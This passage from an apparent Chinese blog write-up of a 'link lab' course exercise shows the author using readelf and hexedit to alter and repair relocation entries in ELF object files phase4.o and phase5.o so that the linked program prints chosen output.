<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  [/home/ywhkkx/ex1.linklab/l4] readelf -s phase4.o</span><br><span class="line">➜  [/home/ywhkkx/ex1.linklab/l4] readelf -S phase4.o</span><br></pre></td></tr></table></figure>
<p>用 readelf 打印重定位节：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">重定位节 <span class="string">&#x27;.rel.rodata&#x27;</span> at offset <span class="number">0x648</span> contains <span class="number">26</span> entries:</span><br><span class="line"> 偏移量     信息    类型              符号值      符号名称</span><br><span class="line"><span class="number">00000000</span>  <span class="number">00000</span>a09 R_386_GOTOFF      <span class="number">0000006</span>d   .L4</span><br><span class="line"><span class="number">00000004</span>  <span class="number">00000b</span>09 R_386_GOTOFF      <span class="number">00000076</span>   .L6</span><br><span class="line"><span class="number">00000008</span>  <span class="number">00000</span>c09 R_386_GOTOFF      <span class="number">0000007f</span>   .L7</span><br><span class="line"><span class="number">0000000</span>c  <span class="number">00000</span>d09 R_386_GOTOFF      <span class="number">00000088</span>   .L8</span><br><span class="line"><span class="number">00000010</span>  <span class="number">00000e09</span> R_386_GOTOFF      <span class="number">00000091</span>   .L9</span><br><span class="line"><span class="number">00000014</span>  <span class="number">00000f</span>09 R_386_GOTOFF      <span class="number">00000097</span>   .L10</span><br><span class="line"><span class="number">00000018</span>  <span class="number">00001009</span> R_386_GOTOFF      <span class="number">0000009</span>d   .L11</span><br><span class="line"><span class="number">0000001</span>c  <span class="number">00001109</span> R_386_GOTOFF      <span class="number">000000</span>a3   .L12</span><br><span class="line"><span class="number">00000020</span>  <span class="number">00001209</span> R_386_GOTOFF      <span class="number">000000</span>a9   .L13</span><br><span class="line"><span class="number">00000024</span>  <span class="number">00001309</span> R_386_GOTOFF      <span class="number">000000</span>af   .L14</span><br><span class="line"><span class="number">00000028</span>  <span class="number">00001409</span> R_386_GOTOFF      <span class="number">000000b</span>5   .L15</span><br><span class="line"><span class="number">0000002</span>c  <span class="number">00001509</span> R_386_GOTOFF      <span class="number">000000b</span>b   .L16</span><br><span class="line"><span class="number">00000030</span>  <span class="number">00001609</span> R_386_GOTOFF      <span class="number">000000</span>c1   .L17</span><br><span class="line"><span class="number">00000034</span>  <span class="number">00001709</span> R_386_GOTOFF      <span class="number">000000</span>c7   .L18</span><br><span class="line"><span class="number">00000038</span>  <span class="number">00001809</span> R_386_GOTOFF      <span class="number">000000</span>cd   .L19</span><br><span class="line"><span class="number">0000003</span>c  <span class="number">00001909</span> R_386_GOTOFF      <span class="number">000000</span>d3   .L20</span><br><span class="line"><span class="number">00000040</span>  <span class="number">00001</span>a09 R_386_GOTOFF      <span class="number">000000</span>d9   .L21</span><br><span class="line"><span class="number">00000044</span>  <span class="number">00001b</span>09 R_386_GOTOFF      <span class="number">000000</span>df   .L22</span><br><span class="line"><span class="number">00000048</span>  <span class="number">00001</span>c09 R_386_GOTOFF      <span class="number">000000e5</span>   .L23</span><br><span class="line"><span class="number">0000004</span>c  <span class="number">00001</span>d09 R_386_GOTOFF      <span class="number">000000</span>eb   .L24</span><br><span class="line"><span class="number">00000050</span>  <span class="number">00001e09</span> R_386_GOTOFF      <span class="number">000000f</span>1   .L25</span><br><span class="line"><span class="number">00000054</span>  <span class="number">00001f</span>09 R_386_GOTOFF      <span class="number">000000f</span>7   .L26</span><br><span class="line"><span class="number">00000058</span>  <span class="number">00002009</span> R_386_GOTOFF      <span class="number">000000f</span>d   .L27</span><br><span class="line"><span class="number">0000005</span>c  <span class="number">00002109</span> R_386_GOTOFF      <span class="number">00000103</span>   .L28</span><br><span class="line"><span class="number">00000060</span>  <span class="number">00002209</span> R_386_GOTOFF      <span class="number">00000109</span>   .L29</span><br><span class="line"><span class="number">00000064</span>  <span class="number">00002309</span> R_386_GOTOFF      <span class="number">0000010f</span>   .L30</span><br></pre></td></tr></table></figure>
<p>获取各个元素的节内偏移</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">➜  [/home/ywhkkx/ex1.linklab/l4] readelf -S phase4.o</span><br><span class="line">There are <span class="number">18</span> section headers, starting at offset <span class="number">0x7cc</span>:</span><br><span class="line"></span><br><span class="line">节头：</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ <span class="number">0</span>]                   <span class="literal">NULL</span>            <span class="number">00000000</span> <span class="number">000000</span> <span class="number">000000</span> <span class="number">00</span>      <span class="number">0</span>   <span class="number">0</span>  <span class="number">0</span></span><br><span class="line">  [ <span class="number">1</span>] .group            GROUP           <span class="number">00000000</span> <span class="number">000034</span> <span class="number">000008</span> <span class="number">04</span>     <span class="number">15</span>  <span class="number">39</span>  <span class="number">4</span></span><br><span class="line">  [ <span class="number">2</span>] .text             PROGBITS        <span class="number">00000000</span> <span class="number">00003</span>c <span class="number">000158</span> <span class="number">00</span>  AX  <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [ <span class="number">3</span>] .rel.text         REL             <span class="number">00000000</span> <span class="number">000618</span> <span class="number">000030</span> <span class="number">08</span>   I <span class="number">15</span>   <span class="number">2</span>  <span class="number">4</span></span><br><span class="line">  [ <span class="number">4</span>] .data             PROGBITS        <span class="number">00000000</span> <span class="number">000194</span> <span class="number">000000</span> <span class="number">00</span>  WA  <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [ <span class="number">5</span>] .bss              NOBITS          <span class="number">00000000</span> <span class="number">000194</span> <span class="number">000000</span> <span class="number">00</span>  WA  <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [ <span class="number">6</span>] .rodata           PROGBITS        <span class="number">00000000</span> <span class="number">000194</span> <span class="number">000068</span> <span class="number">00</span>   A  <span class="number">0</span>   <span class="number">0</span>  <span class="number">4</span></span><br><span class="line">  [ <span class="number">7</span>] .rel.rodata       REL             <span class="number">00000000</span> <span class="number">000648</span> <span class="number">0000</span>d0 <span class="number">08</span>   I <span class="number">15</span>   <span class="number">6</span>  <span class="number">4</span></span><br></pre></td></tr></table></figure>
<p>“.rel.rodata ”的偏移为“000648”，</p>
<p>现在可以用 hexedit 进行修改了，主要关注偏移为“000648”的地方，目的是交换’.rel.rodata’的信息，以改变重定位值，进而改变输出值：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000640</span>   <span class="number">4F</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">02</span> <span class="number">2</span>A <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">09</span> <span class="number">0</span>A <span class="number">00</span> <span class="number">00</span>  O....*..........</span><br><span class="line"><span class="number">00000650</span>   <span class="number">04</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">09</span> <span class="number">0B</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">08</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">09</span> <span class="number">0</span>C <span class="number">00</span> <span class="number">00</span>  ................</span><br><span class="line"><span class="number">00000660</span>   <span class="number">0</span>C <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">09</span> <span class="number">0</span>D <span class="number">00</span> <span class="number">00</span>  <span class="number">10</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">09</span> <span class="number">0</span>E <span class="number">00</span> <span class="number">00</span>  ................</span><br><span class="line"><span class="number">00000670</span>   <span class="number">14</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">09</span> <span class="number">0F</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">18</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">09</span> <span class="number">10</span> <span class="number">00</span> <span class="number">00</span>  ................</span><br><span class="line"><span class="number">00000680</span>   <span class="number">1</span>C <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">09</span> <span class="number">11</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">20</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">09</span> <span class="number">12</span> <span class="number">00</span> <span class="number">00</span>  ........ .......</span><br></pre></td></tr></table></figure>
<ul>
<li>cookie：BGOMEIUFQJ</li>
<li>对应符号名称：L6 L11 L19 L17 L9 L13 L25 L10 L21 L14 </li>
<li>原本的输出：wl0_TZb3vJ</li>
</ul>
<p>假设我们想输出：0123456789</p>
<ul>
<li>对应符号名称：L19 L29 L20 L10 L12 L22 L8 L30 L18 L24</li>
</ul>
<p>然后用 hexedit 做出调换：L6-&gt;L19，L11-&gt;L29，L19-&gt;L20 ……….</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000640</span>   <span class="number">4F</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">02</span> <span class="number">2</span>A <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">09</span> <span class="number">0</span>A <span class="number">00</span> <span class="number">00</span>  O....*..........</span><br><span class="line"><span class="number">00000650</span>   <span class="number">04</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">09</span> <span class="number">18</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">08</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">09</span> <span class="number">0</span>C <span class="number">00</span> <span class="number">00</span>  ................</span><br><span class="line"><span class="number">00000660</span>   <span class="number">0</span>C <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">09</span> <span class="number">0</span>D <span class="number">00</span> <span class="number">00</span>  <span class="number">10</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">09</span> <span class="number">11</span> <span class="number">00</span> <span class="number">00</span>  ................</span><br><span class="line"><span class="number">00000670</span>   <span class="number">14</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">09</span> <span class="number">23</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">18</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">09</span> <span class="number">22</span> <span class="number">00</span> <span class="number">00</span>  .....#.......<span class="string">&quot;..</span></span><br><span class="line"><span class="string">00000680   1C 00 00 00  09 11 00 00  20 00 00 00  09 1B 00 00  ........ .......</span></span><br><span class="line"><span class="string">00000690   24 00 00 00  09 1D 00 00  28 00 00 00  09 14 00 00  $.......(.......</span></span><br><span class="line"><span class="string">000006A0   2C 00 00 00  09 15 00 00  30 00 00 00  09 23 00 00  ,.......0....#..</span></span><br><span class="line"><span class="string">000006B0   34 00 00 00  09 17 00 00  38 00 00 00  09 19 00 00  4.......8.......</span></span><br><span class="line"><span class="string">000006C0   3C 00 00 00  09 19 00 00  40 00 00 00  09 17 00 00  &lt;.......@.......</span></span><br><span class="line"><span class="string">000006D0   44 00 00 00  09 1B 00 00  48 00 00 00  09 1C 00 00  D.......H.......</span></span><br><span class="line"><span class="string">000006E0   4C 00 00 00  09 1D 00 00  50 00 00 00  09 0D 00 00  L.......P.......</span></span><br><span class="line"><span class="string">000006F0   54 00 00 00  09 1F 00 00  58 00 00 00  09 20 00 00  T.......X.... ..</span></span><br><span class="line"><span class="string">00000700   5C 00 00 00  09 21 00 00  60 00 00 00  09 22 00 00  \....!..`....&quot;</span>..</span><br><span class="line"><span class="number">00000710</span>   <span class="number">64</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">09</span> <span class="number">23</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">01</span> <span class="number">26</span> <span class="number">00</span> <span class="number">00</span>  d....#.......&amp;..</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  [/home/ywhkkx/ex1.linklab/l4] gcc -m32 -o linkbomb4 main.o phase4.o</span><br><span class="line">➜  [/home/ywhkkx/ex1.linklab/l4] ./linkbomb4                          </span><br><span class="line"><span class="number">0127456789</span></span><br></pre></td></tr></table></figure>
<h2 id="实验五"><a href="#实验五" class="headerlink" title="实验五"></a>实验五</h2><p>修改二进制可重定位目标文件“phase5.o”的重定位节中的数据内容（不允许修改.text节的内容），补充完成其中被清零的一些重定位记录（分别对应于本模块中需要重定位的符号引用），使其与 main.o 链接后能够正确输出（且仅输出）自己学号</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> TRAN_ARRAY[] = &#123;… …&#125;;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> FDICT[] = FDICTDAT;</span><br><span class="line"><span class="keyword">char</span> BUF[] = MYID; </span><br><span class="line"><span class="keyword">char</span> CODE = PHASE5_COOKIE;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">transform_code</span><span class="params">( <span class="keyword">int</span> code, <span class="keyword">int</span> mode )</span>  </span>&#123;</span><br><span class="line">    <span class="keyword">switch</span>( TRAN_ARRAY [mode] &amp; <span class="number">0x00000007</span> )  &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            code = code &amp; (~ TRAN_ARRAY[mode]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            code = code ^ TRAN_ARRAY[mode];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        … …</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> code;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">generate_code</span><span class="params">( <span class="keyword">int</span> cookie )</span>  </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    CODE = cookie;</span><br><span class="line">    <span class="keyword">for</span>( i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(TRAN_ARRAY)/<span class="keyword">sizeof</span>(<span class="keyword">int</span>); i++ )</span><br><span class="line">          CODE = transform_code( CODE, i );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">encode</span><span class="params">( <span class="keyword">char</span>* str )</span>  </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, n = <span class="built_in">strlen</span>(str);</span><br><span class="line">    <span class="keyword">for</span>( i=<span class="number">0</span>; i&lt;n; i++ ) &#123;</span><br><span class="line">        str[i] = (FDICT[str[i]] ^ CODE) &amp; <span class="number">0x7F</span>;</span><br><span class="line">        <span class="keyword">if</span>( str[i]&lt;<span class="number">0x20</span> || str[i]&gt;<span class="number">0x7E</span> ) str[i] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_phase</span><span class="params">()</span>  </span>&#123;</span><br><span class="line">    generate_code(PHASE5_COOKIE);</span><br><span class="line">    encode(BUF);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, BUF);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>对照 phase5.o 的反汇编程序及已有重定位记录，定位每一空重定位记录可能对应的符号引用</li>
<li>对每一待处理的符号引用，按照下列重定位记录结构，构造其二进制表示（8字节块）</li>
<li>使用 hexedit 或编程将生成的重定位记录写入到相应被清空的记录位置中</li>
</ul>
<p>直接运行程序：（报错了）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  [/home/ywhkkx/ex1.linklab/l5] gcc -m32 -o linkbomb5 main.o phase5.o </span><br><span class="line">➜  [/home/ywhkkx/ex1.linklab/l5] ./linkbomb5 </span><br><span class="line">[<span class="number">1</span>]    <span class="number">4179</span> <span class="function">illegal hardware <span class="title">instruction</span> <span class="params">(core dumped)</span>  ./linkbomb5 </span></span><br></pre></td></tr></table></figure>
<p>可能 实验五 就是为了让我们修复程序，一般段错误有以下原因：</p>
<ul>
<li>未对相关引用进行必要的重定位（实验PTT给出了这个）</li>
</ul>
<p>用GDB单步排查：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invalid instructions at <span class="number">0x56556399</span></span><br></pre></td></tr></table></figure>
<p>“do_phase”出问题了，但不知道是什么问题（其实大概率是重定位的问题，实验给了提示）</p>
<p>看一下重定位表：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">➜  [/home/ywhkkx/ex1.linklab/l5] readelf -r phase5.o</span><br><span class="line"></span><br><span class="line">重定位节 <span class="string">&#x27;.rel.text&#x27;</span> at offset <span class="number">0x6e8</span> contains <span class="number">27</span> entries:</span><br><span class="line"> 偏移量     信息    类型              符号值      符号名称</span><br><span class="line"><span class="number">00000000</span>  <span class="number">00000000</span> R_386_NONE       </span><br><span class="line"><span class="number">00000009</span>  <span class="number">00001b</span>0a R_386_GOTPC       <span class="number">00000000</span>   _GLOBAL_OFFSET_TABLE_</span><br><span class="line"><span class="number">00000013</span>  <span class="number">00001509</span> R_386_GOTOFF      <span class="number">00000000</span>   CmhNnM</span><br><span class="line"><span class="number">00000000</span>  <span class="number">00000000</span> R_386_NONE       </span><br><span class="line"><span class="number">00000000</span>  <span class="number">00000000</span> R_386_NONE       </span><br><span class="line"><span class="number">0000004</span>c  <span class="number">00001509</span> R_386_GOTOFF      <span class="number">00000000</span>   CmhNnM</span><br><span class="line"><span class="number">0000005</span>d  <span class="number">00001509</span> R_386_GOTOFF      <span class="number">00000000</span>   CmhNnM</span><br><span class="line"><span class="number">00000000</span>  <span class="number">00000000</span> R_386_NONE       </span><br><span class="line"><span class="number">0000007</span>e  <span class="number">00001509</span> R_386_GOTOFF      <span class="number">00000000</span>   CmhNnM</span><br><span class="line"><span class="number">00000000</span>  <span class="number">00000000</span> R_386_NONE       </span><br><span class="line"><span class="number">0000009</span>e  <span class="number">00001b</span>0a R_386_GOTPC       <span class="number">00000000</span>   _GLOBAL_OFFSET_TABLE_</span><br><span class="line"><span class="number">000000</span>a7  <span class="number">00001809</span> R_386_GOTOFF      <span class="number">0000000b</span>   CODE</span><br><span class="line"><span class="number">00000000</span>  <span class="number">00000000</span> R_386_NONE       </span><br><span class="line"><span class="number">00000000</span>  <span class="number">00000000</span> R_386_NONE       </span><br><span class="line"><span class="number">000000</span>cc  <span class="number">00001809</span> R_386_GOTOFF      <span class="number">0000000b</span>   CODE</span><br><span class="line"><span class="number">000000</span>ea  <span class="number">00001</span>d02 R_386_PC32        <span class="number">00000000</span>   __x86.get_pc_thunk.bx</span><br><span class="line"><span class="number">00000000</span>  <span class="number">00000000</span> R_386_NONE       </span><br><span class="line"><span class="number">000000f</span>b  <span class="number">00001f</span>04 R_386_PLT32       <span class="number">00000000</span>   <span class="built_in">strlen</span></span><br><span class="line"><span class="number">00000120</span>  <span class="number">00001609</span> R_386_GOTOFF      <span class="number">00000040</span>   cRvFVR</span><br><span class="line"><span class="number">00000127</span>  <span class="number">00001809</span> R_386_GOTOFF      <span class="number">0000000b</span>   CODE</span><br><span class="line"><span class="number">00000000</span>  <span class="number">00000000</span> R_386_NONE       </span><br><span class="line"><span class="number">00000189</span>  <span class="number">00001b</span>0a R_386_GOTPC       <span class="number">00000000</span>   _GLOBAL_OFFSET_TABLE_</span><br><span class="line"><span class="number">00000193</span>  <span class="number">00001</span>c02 R_386_PC32        <span class="number">00000090</span>   generate_code</span><br><span class="line"><span class="number">0000019f</span>  <span class="number">00001709</span> R_386_GOTOFF      <span class="number">00000000</span>   BUF</span><br><span class="line"><span class="number">000001</span>a5  <span class="number">00001e02</span> R_386_PC32        <span class="number">000000e2</span>   encode</span><br><span class="line"><span class="number">000001b</span>1  <span class="number">00001709</span> R_386_GOTOFF      <span class="number">00000000</span>   BUF</span><br><span class="line"><span class="number">000001b</span>7  <span class="number">00002104</span> R_386_PLT32       <span class="number">00000000</span>   <span class="built_in">puts</span></span><br><span class="line"></span><br><span class="line">重定位节 <span class="string">&#x27;.rel.rodata&#x27;</span> at offset <span class="number">0x7c0</span> contains <span class="number">8</span> entries:</span><br><span class="line"> 偏移量     信息    类型              符号值      符号名称</span><br><span class="line"><span class="number">000000</span>c0  <span class="number">00000</span>c09 R_386_GOTOFF      <span class="number">0000002</span>d   .L3</span><br><span class="line"><span class="number">000000</span>c4  <span class="number">00000</span>d09 R_386_GOTOFF      <span class="number">00000032</span>   .L5</span><br><span class="line"><span class="number">000000</span>c8  <span class="number">00000</span>a09 R_386_GOTOFF      <span class="number">00000087</span>   .L2</span><br><span class="line"><span class="number">000000</span>cc  <span class="number">00000e09</span> R_386_GOTOFF      <span class="number">00000046</span>   .L6</span><br><span class="line"><span class="number">000000</span>d0  <span class="number">00000f</span>09 R_386_GOTOFF      <span class="number">00000057</span>   .L7</span><br><span class="line"><span class="number">000000</span>d4  <span class="number">00001009</span> R_386_GOTOFF      <span class="number">00000069</span>   .L8</span><br><span class="line"><span class="number">000000</span>d8  <span class="number">00000</span>a09 R_386_GOTOFF      <span class="number">00000087</span>   .L2</span><br><span class="line"><span class="number">000000</span>dc  <span class="number">00001109</span> R_386_GOTOFF      <span class="number">00000078</span>   .L9</span><br><span class="line"></span><br><span class="line">重定位节 <span class="string">&#x27;.rel.data.rel.local&#x27;</span> at offset <span class="number">0x800</span> contains <span class="number">1</span> entry:</span><br><span class="line"> 偏移量     信息    类型              符号值      符号名称</span><br><span class="line"><span class="number">00000000</span>  <span class="number">00002001</span> R_386_32          <span class="number">0000017b</span>   do_phase</span><br><span class="line"></span><br><span class="line">重定位节 <span class="string">&#x27;.rel.eh_frame&#x27;</span> at offset <span class="number">0x808</span> contains <span class="number">6</span> entries:</span><br><span class="line"> 偏移量     信息    类型              符号值      符号名称</span><br><span class="line"><span class="number">00000020</span>  <span class="number">00000202</span> R_386_PC32        <span class="number">00000000</span>   .text</span><br><span class="line"><span class="number">00000040</span>  <span class="number">00000202</span> R_386_PC32        <span class="number">00000000</span>   .text</span><br><span class="line"><span class="number">00000064</span>  <span class="number">00000202</span> R_386_PC32        <span class="number">00000000</span>   .text</span><br><span class="line"><span class="number">00000088</span>  <span class="number">00000202</span> R_386_PC32        <span class="number">00000000</span>   .text</span><br><span class="line"><span class="number">000000</span>ac  <span class="number">00000702</span> R_386_PC32        <span class="number">00000000</span>   .text.__x86.get_pc_thu</span><br><span class="line"><span class="number">000000</span>c0  <span class="number">00000802</span> R_386_PC32        <span class="number">00000000</span>   .text.__x86.get_pc_thu</span><br></pre></td></tr></table></figure>
<p>发现很多条目空着的，需要补全</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">➜  [/home/ywhkkx/ex1.linklab/l5] readelf -S phase5.o</span><br><span class="line">There are <span class="number">20</span> section headers, starting at offset <span class="number">0x8f0</span>:</span><br><span class="line"></span><br><span class="line">节头：</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ <span class="number">0</span>]                   <span class="literal">NULL</span>            <span class="number">00000000</span> <span class="number">000000</span> <span class="number">000000</span> <span class="number">00</span>      <span class="number">0</span>   <span class="number">0</span>  <span class="number">0</span></span><br><span class="line">  [ <span class="number">1</span>] .group            GROUP           <span class="number">00000000</span> <span class="number">000034</span> <span class="number">000008</span> <span class="number">04</span>     <span class="number">17</span>  <span class="number">26</span>  <span class="number">4</span></span><br><span class="line">  [ <span class="number">2</span>] .group            GROUP           <span class="number">00000000</span> <span class="number">00003</span>c <span class="number">000008</span> <span class="number">04</span>     <span class="number">17</span>  <span class="number">29</span>  <span class="number">4</span></span><br><span class="line">  [ <span class="number">3</span>] .text             PROGBITS        <span class="number">00000000</span> <span class="number">000044</span> <span class="number">0001</span>c4 <span class="number">00</span>  AX  <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [ <span class="number">4</span>] .rel.text         REL             <span class="number">00000000</span> <span class="number">0006e8</span> <span class="number">0000</span>d8 <span class="number">08</span>   I <span class="number">17</span>   <span class="number">3</span>  <span class="number">4</span></span><br><span class="line">  [ <span class="number">5</span>] .data             PROGBITS        <span class="number">00000000</span> <span class="number">000208</span> <span class="number">00000</span>c <span class="number">00</span>  WA  <span class="number">0</span>   <span class="number">0</span>  <span class="number">4</span></span><br><span class="line">  [ <span class="number">6</span>] .bss              NOBITS          <span class="number">00000000</span> <span class="number">000214</span> <span class="number">000000</span> <span class="number">00</span>  WA  <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [ <span class="number">7</span>] .rodata           PROGBITS        <span class="number">00000000</span> <span class="number">000220</span> <span class="number">0000e0</span> <span class="number">00</span>   A  <span class="number">0</span>   <span class="number">0</span> <span class="number">32</span></span><br><span class="line">  [ <span class="number">8</span>] .rel.rodata       REL             <span class="number">00000000</span> <span class="number">0007</span>c0 <span class="number">000040</span> <span class="number">08</span>   I <span class="number">17</span>   <span class="number">7</span>  <span class="number">4</span></span><br></pre></td></tr></table></figure>
<p>“.rel.rodata”偏移为“0x7c0”，“.rel.text”偏移为“0x6e8”</p>
<p>在 hexedit 中看看：</p>
